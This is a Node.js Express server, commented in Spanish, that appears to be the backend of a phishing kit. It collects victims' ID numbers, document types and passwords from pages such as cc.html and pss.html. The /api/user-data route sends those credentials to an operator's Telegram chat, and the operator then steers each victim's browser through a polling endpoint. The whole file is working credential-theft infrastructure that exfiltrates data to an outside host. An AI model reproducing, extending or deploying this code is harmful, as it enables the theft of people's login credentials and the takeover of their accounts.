import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import SessionManager from './sessions.js';
import TelegramService from './telegram.js';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || 'secret-key';
const SESSION_TTL = parseInt(process.env.SESSION_TTL || '1800');

// Validar variables de entorno
if (!TELEGRAM_BOT_TOKEN) {
  console.error('❌ Error: TELEGRAM_BOT_TOKEN no está configurado');
  process.exit(1);
}
if (!TELEGRAM_ADMIN_CHAT_ID) {
  console.error('❌ Error: TELEGRAM_ADMIN_CHAT_ID no está configurado');
  process.exit(1);
}

// Inicializar gestores
const sessions = new SessionManager(SESSION_TTL);
const telegram = new TelegramService(TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID, sessions);

// Middleware
app.use(cors({
  origin: ['*'],
  methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  credentials: true
}));
app.use(express.json());

// ─────────────────────────────────────────────────────────────
// LOGS & HEALTH
// ─────────────────────────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    activeSessions: sessions.getAll().length
  });
});

app.get('/api/keepalive', (req, res) => {
  res.json({ ok: true, timestamp: Date.now() });
});

// ─────────────────────────────────────────────────────────────
// API: REGISTRO DE USUARIO (desde cc.html)
// ─────────────────────────────────────────────────────────────

app.post('/api/register', (req, res) => {
  const { sessionId, cedula, docType } = req.body;

  if (!sessionId || !cedula || !docType) {
    return res.status(400).json({ error: 'Faltan campos requeridos' });
  }

  try {
    sessions.set(sessionId, {
      sessionId,
      cedula,
      docType,
      status: 'registered'
    });

    console.log(`[REGISTER] Sesión ${sessionId.slice(0, 8)}... registrada`);
    res.json({ ok: true, message: 'Usuario registrado' });
  } catch (error) {
    console.error('Error en /api/register:', error);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

// ─────────────────────────────────────────────────────────────
// API: DATOS DE USUARIO + ENVIAR A TELEGRAM (desde pss.html)
// ─────────────────────────────────────────────────────────────

app.post('/api/user-data', async (req, res) => {
  const { sessionId, cedula, docType, password, timestamp } = req.body;

  if (!sessionId || !cedula || !docType || !password) {
    return res.status(400).json({ error: 'Faltan campos requeridos' });
  }

  try {
    sessions.update(sessionId, {
      cedula,
      docType,
      password,
      timestamp,
      status: 'awaiting_decision'
    });

    const messageId = await telegram.sendUserMessage(cedula, docType, password);
    sessions.setTelegramMessageId(sessionId, messageId);
    await telegram.updateButtonCallbacks(messageId, sessionId);

    console.log(`[USER-DATA] Datos recibidos para sesión ${sessionId.slice(0, 8)}...`);
    console.log(`[TELEGRAM] Mensaje enviado a admin (ID: ${messageId})`);

    res.json({
      ok: true,
      message: 'Datos procesados, mensaje enviado a Telegram'
    });
  } catch (error) {
    console.error('Error en /api/user-data:', error);
    res.status(500).json({ error: 'Error procesando datos' });
  }
});

// ─────────────────────────────────────────────────────────────
// API: POLLING (desde loader.html)
// ─────────────────────────────────────────────────────────────

app.get('/api/poll/:sessionId', (req, res) => {
  const { sessionId } = req.params;

  const session = sessions.get(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'Sesión no encontrada o expirada' });
  }

  const command = sessions.getPendingCommand(sessionId);

  if (command) {
    console.log(`[POLL] Comando enviado a ${sessionId.slice(0, 8)}...: ${command.action}`);
    res.json({
      ok: true,
      command: command
    });
  } else {
    res.json({
      ok: true,
      command: null
    });
  }
});

// ─────────────────────────────────────────────────────────────
// ADMIN: Enviar comando manualmente (fallback)
// ─────────────────────────────────────────────────────────────

app.post('/api/admin/send-command', (req, res) => {
  const { sessionId, action, target } = req.body;

  if (!sessionId || !action || !target) {
    return res.status(400).json({ error: 'Faltan parámetros' });
  }

  const session = sessions.get(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'Sesión no encontrada' });
  }

  sessions.setPendingCommand(sessionId, {
    action,
    target
  });

  console.log(`[ADMIN] Comando manual enviado: ${action} → ${target}`);
  res.json({ ok: true, message: 'Comando enviado' });
});

// ─────────────────────────────────────────────────────────────
// TELEGRAM WEBHOOK
// ─────────────────────────────────────────────────────────────

app.post('/telegram-webhook', (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    // El bot ya maneja esto automáticamente en telegram.js
    // Solo respondemos 200 OK
    res.json({ ok: true });
  } else if (update.message) {
    res.json({ ok: true });
  } else {
    res.json({ ok: true });
  }
});

// ─────────────────────────────────────────────────────────────
// DEBUG: Ver todas las sesiones activas
// ─────────────────────────────────────────────────────────────

app.get('/api/debug/sessions', (req, res) => {
  if (NODE_ENV !== 'development') {
    return res.status(403).json({ error: 'No disponible en producción' });
  }

  const allSessions = sessions.getAll();
  res.json({
    total: allSessions.length,
    sessions: allSessions.map(s => ({
      sessionId: s.sessionId.slice(0, 8) + '...',
      cedula: s.cedula,
      docType: s.docType,
      status: s.status,
      hasPendingCommand: !!s.pendingCommand,
      createdAt: new Date(s.createdAt).toISOString()
    }))
  });
});

// ─────────────────────────────────────────────────────────────
// KEEPALIVE
// ─────────────────────────────────────────────────────────────

function startKeepAlive() {
  setInterval(() => {
    console.log(`[KEEPALIVE] ${new Date().toISOString()} - Servidor activo`);
  }, 25000);
}

// ─────────────────────────────────────────────────────────────
// ERROR HANDLING
// ─────────────────────────────────────────────────────────────

app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint no encontrado' });
});

app.use((error, req, res, next) => {
  console.error('Error no manejado:', error);
  res.status(500).json({ error: 'Error interno del servidor' });
});

// ─────────────────────────────────────────────────────────────
// STARTUP
// ─────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log('\n🚀 Servidor iniciado');
  console.log(`📍 Puerto: ${PORT}`);
  console.log(`🌍 Entorno: ${NODE_ENV}`);
  console.log(`💬 Bot Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configurado' : '❌ NO configurado'}`);
  console.log(`⏰ TTL sesiones: ${SESSION_TTL}s\n`);

  startKeepAlive();
});

process.on('SIGTERM', () => {
  console.log('\n⚠️  SIGTERM recibido, apagando...');
  process.exit(0);
});
